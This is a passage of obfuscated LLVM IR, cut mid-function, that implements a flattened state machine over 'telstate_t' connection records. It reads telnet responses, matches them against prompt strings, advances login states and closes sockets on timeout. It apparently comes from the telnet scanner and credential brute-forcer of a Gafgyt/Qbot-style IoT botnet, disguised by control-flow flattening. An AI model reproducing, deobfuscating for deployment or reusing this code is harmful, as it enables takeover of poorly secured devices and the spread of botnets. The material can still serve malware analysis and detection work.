  %.reload253 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %643 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload253, i64 %642
  %644 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %643, i32 0, i32 6
  store i32 %640, i32* %644, align 4
  store i32 -1282484026, i32* %switchVar
  br label %loopEnd

; <label>:645:                                    ; preds = %loopEntry
  %646 = load i32, i32* %2, align 4
  %647 = sext i32 %646 to i64
  %.reload252 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %648 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload252, i64 %647
  %649 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %648, i32 0, i32 0
  %650 = load i32, i32* %649, align 16
  %651 = load i32, i32* %2, align 4
  %652 = sext i32 %651 to i64
  %.reload251 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %653 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload251, i64 %652
  %654 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %653, i32 0, i32 8
  %655 = load i8*, i8** %654, align 8
  %656 = load i32, i32* %2, align 4
  %657 = sext i32 %656 to i64
  %.reload250 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %658 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload250, i64 %657
  %659 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %658, i32 0, i32 7
  %660 = load i16, i16* %659, align 16
  %661 = zext i16 %660 to i32
  %662 = call i32 @readUntil(i32 %650, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.28, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %655, i32 1024, i32 %661)
  %663 = icmp ne i32 %662, 0
  %664 = select i1 %663, i32 -1441884655, i32 928859799
  store i32 %664, i32* %switchVar
  br label %loopEnd

; <label>:665:                                    ; preds = %loopEntry
  %666 = load i32, i32* %2, align 4
  %667 = sext i32 %666 to i64
  %.reload249 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %668 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload249, i64 %667
  %669 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %668, i32 0, i32 6
  store i32 0, i32* %669, align 4
  %670 = load i32, i32* %2, align 4
  %671 = sext i32 %670 to i64
  %.reload248 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %672 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload248, i64 %671
  %673 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %672, i32 0, i32 7
  store i16 0, i16* %673, align 16
  %674 = load i32, i32* %2, align 4
  %675 = sext i32 %674 to i64
  %.reload247 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %676 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload247, i64 %675
  %677 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %676, i32 0, i32 8
  %678 = load i8*, i8** %677, align 8
  %679 = call i8* @strstr(i8* %678, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.28, i32 0, i32 0)) #10
  %680 = icmp ne i8* %679, null
  %681 = select i1 %680, i32 1551600827, i32 -1110635405
  store i32 %681, i32* %switchVar
  br label %loopEnd

; <label>:682:                                    ; preds = %loopEntry
  %683 = load i32, i32* %2, align 4
  %684 = sext i32 %683 to i64
  %.reload246 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %685 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload246, i64 %684
  %686 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %685, i32 0, i32 2
  store i8 5, i8* %686, align 8
  store i32 630008239, i32* %switchVar
  br label %loopEnd

; <label>:687:                                    ; preds = %loopEntry
  %688 = load i32, i32* %2, align 4
  %689 = sext i32 %688 to i64
  %.reload245 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %690 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload245, i64 %689
  %691 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %690, i32 0, i32 2
  store i8 7, i8* %691, align 8
  store i32 630008239, i32* %switchVar
  br label %loopEnd

; <label>:692:                                    ; preds = %loopEntry
  %693 = load i32, i32* %2, align 4
  %694 = sext i32 %693 to i64
  %.reload244 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %695 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload244, i64 %694
  %696 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %695, i32 0, i32 8
  %697 = load i8*, i8** %696, align 8
  call void @llvm.memset.p0i8.i64(i8* %697, i8 0, i64 1024, i32 1, i1 false)
  store i32 -1810828069, i32* %switchVar
  br label %loopEnd

; <label>:698:                                    ; preds = %loopEntry
  %699 = load i32, i32* %2, align 4
  %700 = sext i32 %699 to i64
  %.reload243 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %701 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload243, i64 %700
  %702 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %701, i32 0, i32 0
  %703 = load i32, i32* %702, align 16
  %704 = load i32, i32* %2, align 4
  %705 = sext i32 %704 to i64
  %.reload242 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %706 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload242, i64 %705
  %707 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %706, i32 0, i32 8
  %708 = load i8*, i8** %707, align 8
  %709 = load i32, i32* %2, align 4
  %710 = sext i32 %709 to i64
  %.reload241 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %711 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload241, i64 %710
  %712 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %711, i32 0, i32 7
  %713 = load i16, i16* %712, align 16
  %714 = zext i16 %713 to i32
  %715 = call i32 @readUntil(i32 %703, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.30, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %708, i32 1024, i32 %714)
  %716 = icmp ne i32 %715, 0
  %717 = select i1 %716, i32 1206228157, i32 1405948800
  store i32 %717, i32* %switchVar
  br label %loopEnd

; <label>:718:                                    ; preds = %loopEntry
  %719 = load i32, i32* %2, align 4
  %720 = sext i32 %719 to i64
  %.reload240 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %721 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload240, i64 %720
  %722 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %721, i32 0, i32 6
  store i32 0, i32* %722, align 4
  %723 = load i32, i32* %2, align 4
  %724 = sext i32 %723 to i64
  %.reload239 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %725 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload239, i64 %724
  %726 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %725, i32 0, i32 7
  store i16 0, i16* %726, align 16
  %727 = load i32, i32* %2, align 4
  %728 = sext i32 %727 to i64
  %.reload238 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %729 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload238, i64 %728
  %730 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %729, i32 0, i32 8
  %731 = load i8*, i8** %730, align 8
  %732 = call i8* @strstr(i8* %731, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.30, i32 0, i32 0)) #10
  %733 = icmp ne i8* %732, null
  %734 = select i1 %733, i32 -1130288854, i32 -370023278
  store i32 %734, i32* %switchVar
  br label %loopEnd

; <label>:735:                                    ; preds = %loopEntry
  %736 = load i32, i32* %2, align 4
  %737 = sext i32 %736 to i64
  %.reload237 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %738 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload237, i64 %737
  %739 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %738, i32 0, i32 2
  store i8 5, i8* %739, align 8
  store i32 -952107908, i32* %switchVar
  br label %loopEnd

; <label>:740:                                    ; preds = %loopEntry
  %741 = load i32, i32* %2, align 4
  %742 = sext i32 %741 to i64
  %.reload236 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %743 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload236, i64 %742
  %744 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %743, i32 0, i32 2
  store i8 7, i8* %744, align 8
  store i32 -952107908, i32* %switchVar
  br label %loopEnd

; <label>:745:                                    ; preds = %loopEntry
  %746 = load i32, i32* %2, align 4
  %747 = sext i32 %746 to i64
  %.reload235 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %748 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload235, i64 %747
  %749 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %748, i32 0, i32 8
  %750 = load i8*, i8** %749, align 8
  call void @llvm.memset.p0i8.i64(i8* %750, i8 0, i64 1024, i32 1, i1 false)
  store i32 -1810828069, i32* %switchVar
  br label %loopEnd

; <label>:751:                                    ; preds = %loopEntry
  %752 = load i32, i32* %2, align 4
  %753 = sext i32 %752 to i64
  %.reload234 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %754 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload234, i64 %753
  %755 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %754, i32 0, i32 8
  %756 = load i8*, i8** %755, align 8
  %757 = call i8* @strstr(i8* %756, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.32, i32 0, i32 0)) #10
  %758 = icmp ne i8* %757, null
  %759 = select i1 %758, i32 -243409135, i32 -1914074891
  store i32 %759, i32* %switchVar
  br label %loopEnd

; <label>:760:                                    ; preds = %loopEntry
  %761 = load i32, i32* %2, align 4
  %762 = sext i32 %761 to i64
  %.reload233 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %763 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload233, i64 %762
  %764 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %763, i32 0, i32 0
  %765 = load i32, i32* %764, align 16
  %766 = call i32 @sclose(i32 %765)
  %767 = load i32, i32* %2, align 4
  %768 = sext i32 %767 to i64
  %.reload232 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %769 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload232, i64 %768
  %770 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %769, i32 0, i32 2
  store i8 0, i8* %770, align 8
  %771 = load i32, i32* %2, align 4
  %772 = sext i32 %771 to i64
  %.reload231 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %773 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload231, i64 %772
  %774 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %773, i32 0, i32 3
  store i8 0, i8* %774, align 1
  store i32 -1810828069, i32* %switchVar
  br label %loopEnd

; <label>:775:                                    ; preds = %loopEntry
  %776 = load i32, i32* %2, align 4
  %777 = sext i32 %776 to i64
  %.reload230 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %778 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload230, i64 %777
  %779 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %778, i32 0, i32 8
  %780 = load i8*, i8** %779, align 8
  %781 = call i8* @strstr(i8* %780, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.33, i32 0, i32 0)) #10
  %782 = icmp ne i8* %781, null
  %783 = select i1 %782, i32 -263279314, i32 916763785
  store i32 %783, i32* %switchVar
  br label %loopEnd

; <label>:784:                                    ; preds = %loopEntry
  %785 = load i32, i32* %2, align 4
  %786 = sext i32 %785 to i64
  %.reload229 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %787 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload229, i64 %786
  %788 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %787, i32 0, i32 0
  %789 = load i32, i32* %788, align 16
  %790 = call i32 @sclose(i32 %789)
  %791 = load i32, i32* %2, align 4
  %792 = sext i32 %791 to i64
  %.reload228 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %793 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload228, i64 %792
  %794 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %793, i32 0, i32 2
  store i8 0, i8* %794, align 8
  %795 = load i32, i32* %2, align 4
  %796 = sext i32 %795 to i64
  %.reload227 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %797 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload227, i64 %796
  %798 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %797, i32 0, i32 3
  store i8 0, i8* %798, align 1
  store i32 -1810828069, i32* %switchVar
  br label %loopEnd

; <label>:799:                                    ; preds = %loopEntry
  %800 = load i32, i32* %2, align 4
  %801 = sext i32 %800 to i64
  %.reload226 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %802 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload226, i64 %801
  %803 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %802, i32 0, i32 8
  %804 = load i8*, i8** %803, align 8
  %805 = call i8* @strstr(i8* %804, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.34, i32 0, i32 0)) #10
  %806 = icmp ne i8* %805, null
  %807 = select i1 %806, i32 660326320, i32 -1684910553
  store i32 %807, i32* %switchVar
  br label %loopEnd

; <label>:808:                                    ; preds = %loopEntry
  %809 = load i32, i32* %2, align 4
  %810 = sext i32 %809 to i64
  %.reload225 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %811 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload225, i64 %810
  %812 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %811, i32 0, i32 0
  %813 = load i32, i32* %812, align 16
  %814 = call i32 @sclose(i32 %813)
  %815 = load i32, i32* %2, align 4
  %816 = sext i32 %815 to i64
  %.reload224 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %817 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload224, i64 %816
  %818 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %817, i32 0, i32 2
  store i8 0, i8* %818, align 8
  %819 = load i32, i32* %2, align 4
  %820 = sext i32 %819 to i64
  %.reload223 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %821 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload223, i64 %820
  %822 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %821, i32 0, i32 3
  store i8 0, i8* %822, align 1
  store i32 -1810828069, i32* %switchVar
  br label %loopEnd

; <label>:823:                                    ; preds = %loopEntry
  %824 = load i32, i32* %2, align 4
  %825 = sext i32 %824 to i64
  %.reload222 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %826 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload222, i64 %825
  %827 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %826, i32 0, i32 8
  %828 = load i8*, i8** %827, align 8
  %829 = call i8* @strstr(i8* %828, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.35, i32 0, i32 0)) #10
  %830 = icmp ne i8* %829, null
  %831 = select i1 %830, i32 753170833, i32 419227474
  store i32 %831, i32* %switchVar
  br label %loopEnd

; <label>:832:                                    ; preds = %loopEntry
  %833 = load i32, i32* %2, align 4
  %834 = sext i32 %833 to i64
  %.reload221 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %835 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload221, i64 %834
  %836 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %835, i32 0, i32 0
  %837 = load i32, i32* %836, align 16
  %838 = call i32 @sclose(i32 %837)
  %839 = load i32, i32* %2, align 4
  %840 = sext i32 %839 to i64
  %.reload220 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %841 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload220, i64 %840
  %842 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %841, i32 0, i32 2
  store i8 0, i8* %842, align 8
  %843 = load i32, i32* %2, align 4
  %844 = sext i32 %843 to i64
  %.reload219 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %845 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload219, i64 %844
  %846 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %845, i32 0, i32 3
  store i8 0, i8* %846, align 1
  store i32 -1810828069, i32* %switchVar
  br label %loopEnd

; <label>:847:                                    ; preds = %loopEntry
  %848 = load i32, i32* %2, align 4
  %849 = sext i32 %848 to i64
  %.reload218 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %850 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload218, i64 %849
  %851 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %850, i32 0, i32 8
  %852 = load i8*, i8** %851, align 8
  %853 = call i8* @strstr(i8* %852, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.36, i32 0, i32 0)) #10
  %854 = icmp ne i8* %853, null
  %855 = select i1 %854, i32 1464272896, i32 -1370898069
  store i32 %855, i32* %switchVar
  br label %loopEnd

; <label>:856:                                    ; preds = %loopEntry
  %857 = load i32, i32* %2, align 4
  %858 = sext i32 %857 to i64
  %.reload217 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %859 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload217, i64 %858
  %860 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %859, i32 0, i32 0
  %861 = load i32, i32* %860, align 16
  %862 = call i32 @sclose(i32 %861)
  %863 = load i32, i32* %2, align 4
  %864 = sext i32 %863 to i64
  %.reload216 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %865 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload216, i64 %864
  %866 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %865, i32 0, i32 2
  store i8 0, i8* %866, align 8
  %867 = load i32, i32* %2, align 4
  %868 = sext i32 %867 to i64
  %.reload215 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %869 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload215, i64 %868
  %870 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %869, i32 0, i32 3
  store i8 0, i8* %870, align 1
  store i32 -1810828069, i32* %switchVar
  br label %loopEnd

; <label>:871:                                    ; preds = %loopEntry
  %872 = load i32, i32* %2, align 4
  %873 = sext i32 %872 to i64
  %.reload214 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %874 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload214, i64 %873
  %875 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %874, i32 0, i32 8
  %876 = load i8*, i8** %875, align 8
  %877 = call i8* @strstr(i8* %876, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.37, i32 0, i32 0)) #10
  %878 = icmp ne i8* %877, null
  %879 = select i1 %878, i32 304774092, i32 37129940
  store i32 %879, i32* %switchVar
  br label %loopEnd

; <label>:880:                                    ; preds = %loopEntry
  %881 = load i32, i32* %2, align 4
  %882 = sext i32 %881 to i64
  %.reload213 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %883 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload213, i64 %882
  %884 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %883, i32 0, i32 0
  %885 = load i32, i32* %884, align 16
  %886 = call i32 @sclose(i32 %885)
  %887 = load i32, i32* %2, align 4
  %888 = sext i32 %887 to i64
  %.reload212 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %889 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload212, i64 %888
  %890 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %889, i32 0, i32 2
  store i8 0, i8* %890, align 8
  %891 = load i32, i32* %2, align 4
  %892 = sext i32 %891 to i64
  %.reload211 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %893 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload211, i64 %892
  %894 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %893, i32 0, i32 3
  store i8 0, i8* %894, align 1
  store i32 -1810828069, i32* %switchVar
  br label %loopEnd

; <label>:895:                                    ; preds = %loopEntry
  %896 = load i32, i32* %2, align 4
  %897 = sext i32 %896 to i64
  %.reload210 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %898 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload210, i64 %897
  %899 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %898, i32 0, i32 8
  %900 = load i8*, i8** %899, align 8
  %901 = call i8* @strstr(i8* %900, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.38, i32 0, i32 0)) #10
  %902 = icmp ne i8* %901, null
  %903 = select i1 %902, i32 825234541, i32 -1563395537
  store i32 %903, i32* %switchVar
  br label %loopEnd

; <label>:904:                                    ; preds = %loopEntry
  %905 = load i32, i32* %2, align 4
  %906 = sext i32 %905 to i64
  %.reload209 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %907 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload209, i64 %906
  %908 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %907, i32 0, i32 0
  %909 = load i32, i32* %908, align 16
  %910 = call i32 @sclose(i32 %909)
  %911 = load i32, i32* %2, align 4
  %912 = sext i32 %911 to i64
  %.reload208 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %913 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload208, i64 %912
  %914 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %913, i32 0, i32 2
  store i8 0, i8* %914, align 8
  %915 = load i32, i32* %2, align 4
  %916 = sext i32 %915 to i64
  %.reload207 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %917 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload207, i64 %916
  %918 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %917, i32 0, i32 3
  store i8 0, i8* %918, align 1
  store i32 -1810828069, i32* %switchVar
  br label %loopEnd

; <label>:919:                                    ; preds = %loopEntry
  %920 = load i32, i32* %2, align 4
  %921 = sext i32 %920 to i64
  %.reload206 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %922 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload206, i64 %921
  %923 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %922, i32 0, i32 8
  %924 = load i8*, i8** %923, align 8
  %925 = call i8* @strstr(i8* %924, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.39, i32 0, i32 0)) #10
  %926 = icmp ne i8* %925, null
  %927 = select i1 %926, i32 360956939, i32 1291203358
  store i32 %927, i32* %switchVar
  br label %loopEnd

; <label>:928:                                    ; preds = %loopEntry
  %929 = load i32, i32* %2, align 4
  %930 = sext i32 %929 to i64
  %.reload205 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %931 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload205, i64 %930
  %932 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %931, i32 0, i32 0
  %933 = load i32, i32* %932, align 16
  %934 = call i32 @sclose(i32 %933)
  %935 = load i32, i32* %2, align 4
  %936 = sext i32 %935 to i64
  %.reload204 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %937 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload204, i64 %936
  %938 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %937, i32 0, i32 2
  store i8 0, i8* %938, align 8
  %939 = load i32, i32* %2, align 4
  %940 = sext i32 %939 to i64
  %.reload203 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %941 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload203, i64 %940
  %942 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %941, i32 0, i32 3
  store i8 0, i8* %942, align 1
  store i32 -1810828069, i32* %switchVar
  br label %loopEnd

; <label>:943:                                    ; preds = %loopEntry
  store i32 -1166347792, i32* %switchVar
  br label %loopEnd

; <label>:944:                                    ; preds = %loopEntry
  store i32 -1935903023, i32* %switchVar
  br label %loopEnd

; <label>:945:                                    ; preds = %loopEntry
  store i32 902266113, i32* %switchVar
  br label %loopEnd

; <label>:946:                                    ; preds = %loopEntry
  store i32 1529505355, i32* %switchVar
  br label %loopEnd

; <label>:947:                                    ; preds = %loopEntry
  store i32 -62511576, i32* %switchVar
  br label %loopEnd

; <label>:948:                                    ; preds = %loopEntry
  store i32 1658052923, i32* %switchVar
  br label %loopEnd

; <label>:949:                                    ; preds = %loopEntry
  store i32 1065325925, i32* %switchVar
  br label %loopEnd

; <label>:950:                                    ; preds = %loopEntry
  %951 = load i32, i32* %2, align 4
  %952 = sext i32 %951 to i64
  %.reload202 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %953 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload202, i64 %952
  %954 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %953, i32 0, i32 8
  %955 = load i8*, i8** %954, align 8
  %956 = call i64 @strlen(i8* %955) #10
  %957 = trunc i64 %956 to i16
  %958 = load i32, i32* %2, align 4
  %959 = sext i32 %958 to i64
  %.reload201 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %960 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload201, i64 %959
  %961 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %960, i32 0, i32 7
  store i16 %957, i16* %961, align 16
  store i32 -946145282, i32* %switchVar
  br label %loopEnd

; <label>:962:                                    ; preds = %loopEntry
  store i32 171053274, i32* %switchVar
  br label %loopEnd

; <label>:963:                                    ; preds = %loopEntry
  %964 = load i32, i32* %2, align 4
  %965 = sext i32 %964 to i64
  %.reload200 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %966 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload200, i64 %965
  %967 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %966, i32 0, i32 6
  %968 = load i32, i32* %967, align 4
  %969 = add i32 %968, 10
  %970 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %971 = icmp ult i32 %969, %970
  %972 = select i1 %971, i32 1812402116, i32 -940618243
  store i32 %972, i32* %switchVar
  br label %loopEnd

; <label>:973:                                    ; preds = %loopEntry
  %974 = load i32, i32* %2, align 4
  %975 = sext i32 %974 to i64
  %.reload199 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %976 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload199, i64 %975
  %977 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %976, i32 0, i32 0
  %978 = load i32, i32* %977, align 16
  %979 = call i32 @sclose(i32 %978)
  %980 = load i32, i32* %2, align 4
  %981 = sext i32 %980 to i64
  %.reload198 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %982 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload198, i64 %981
  %983 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %982, i32 0, i32 2
  store i8 0, i8* %983, align 8
  %984 = load i32, i32* %2, align 4
  %985 = sext i32 %984 to i64
  %.reload197 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %986 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload197, i64 %985
  %987 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %986, i32 0, i32 3
  store i8 1, i8* %987, align 1
  store i32 -940618243, i32* %switchVar
  br label %loopEnd

; <label>:988:                                    ; preds = %loopEntry
  store i32 -2108438042, i32* %switchVar
  br label %loopEnd

; <label>:989:                                    ; preds = %loopEntry
  %990 = load i32, i32* %2, align 4
  %991 = sext i32 %990 to i64
  %.reload196 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %992 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload196, i64 %991
  %993 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %992, i32 0, i32 0
  %994 = load i32, i32* %993, align 16
  %995 = load i32, i32* %2, align 4
  %996 = sext i32 %995 to i64
  %.reload195 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem20
  %997 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload195, i64 %996
  %998 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %997, i32 0, i32 5
